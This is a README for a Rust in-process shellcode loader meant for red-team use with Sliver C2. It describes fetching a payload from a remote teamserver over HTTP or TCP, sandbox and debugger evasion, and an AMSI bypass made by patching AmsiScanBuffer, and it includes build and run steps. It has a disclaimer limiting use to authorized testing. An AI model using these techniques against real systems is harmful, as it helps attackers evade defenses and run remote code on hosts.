# RustHarderInProcess

A Rust-based in-process shellcode loader for Windows, designed for red team use with [Sliver C2](https://github.com/BishopFox/sliver) (or any shellcode payload). Rust port of [tryharder](https://github.com/tehstoni/tryharder).

## Overview

The loader fetches a raw shellcode binary from a remote source, allocates executable memory in the current process, copies the shellcode in, and executes it on a new thread. Several evasion techniques are applied before staging to reduce detection probability.

## Features

### Evasion
- **Sleep-based sandbox detection** — sleeps for 2 seconds and verifies elapsed wall time; short-circuiting (e.g. by a sandbox fast-forwarding the clock) causes immediate exit
- **Anti-debugging** — timing-based check using `GetCurrentThreadId` with short sleeps
- **AMSI bypass** — patches `AmsiScanBuffer` in-process by overwriting the first 6 bytes with `0x40` (`inc eax`) NOPs, disabling AMSI scanning for the process lifetime

### Payload Delivery
Supports two transport schemes:

| Scheme | Description |
|--------|-------------|
| `http://` / `https://` | Downloads shellcode via HTTP(S) using `reqwest` |
| `tcp://host:port` | Connects to a raw TCP listener; expects a 4-byte LE length prefix followed by the payload bytes |

The TCP handler is the primary path for Sliver staged payloads (`sliver-server` → *TCP Stager Listener*).

### Execution
- `VirtualAlloc` / `VirtualProtect` API names are resolved at runtime from character arrays (basic static analysis evasion)
- Shellcode is allocated `RW`, copied in, flipped to `RX`, then executed via `CreateThread`
- Main thread blocks on `WaitForSingleObject`

## Dependencies

| Crate | Purpose |
|-------|---------|
| `winapi` | Low-level Win32 bindings (memory, process, threading, AMSI) |
| `windows-sys` | `CreateThread` / `WaitForSingleObject` |
| `reqwest` (blocking) | HTTP(S) payload download |

## Usage

1. Update the payload URL in `src/main.rs`:
   ```rust
   let url = "http://<teamserver>:<port>/agent.x64.bin";
   // or
   let url = "tcp://<teamserver>:<port>";
   ```

2. Build (cross-compile to Windows x64 if needed):
   ```bash
   cargo build --release --target x86_64-pc-windows-msvc
   ```

3. Start your Sliver stager listener (or any HTTP/TCP shellcode server) and run the compiled binary on the target.

## Notes

- **Windows only** — uses Win32 APIs exclusively; will not compile for other targets
- Requires `unsafe` throughout due to raw pointer manipulation and FFI
- The memory check (`GlobalMemoryStatusEx`) is present but currently commented out; uncomment to exit on low-memory (sandbox) environments

## Disclaimer

This tool is intended for authorized red team engagements and security research only. Do not use against systems you do not own or have explicit written permission to test.
